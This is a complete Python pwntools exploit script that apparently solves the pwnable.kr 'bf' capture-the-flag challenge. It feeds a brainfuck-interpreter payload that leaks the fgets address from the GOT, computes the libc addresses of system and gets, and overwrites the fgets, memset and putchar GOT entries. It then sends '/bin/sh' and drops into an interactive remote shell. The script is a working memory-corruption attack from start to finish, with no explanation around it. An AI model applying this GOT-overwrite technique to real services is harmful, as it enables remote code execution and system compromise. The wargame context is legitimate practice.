from pwn import *

libc = ELF('./bf_libc.so')
conn = remote('pwnable.kr', 9001)

conn.recvline_startswith('type')

payload =  "<" * ( 0x0804a0a0 - 0x804a010)
payload += ".>" * 4 #read fget@plt address
payload += "<" * 4 #move to start of fget@plt 
payload += ",>" *4 #overwrite fget@plt to system()
payload += ">" * ( 0x804a02c - 0x804a014)
payload += ",>" * 4 #overwrite memset to gets
payload += ",>" * 4 #overwrite putchar to main
payload += "." #execute main function

conn.sendline(payload)

fgets_addr = conn.recvn(4)[::-1].encode('hex')
system_addr = int(fgets_addr,16) - libc.symbols['fgets'] + libc.symbols['system']
gets_addr = int(fgets_addr,16) - libc.symbols['fgets'] + libc.symbols['gets']

conn.send(p32(system_addr))
conn.send(p32(gets_addr))
conn.send(p32(0x8048671))
conn.sendline('/bin/sh\x00')
conn.interactive()
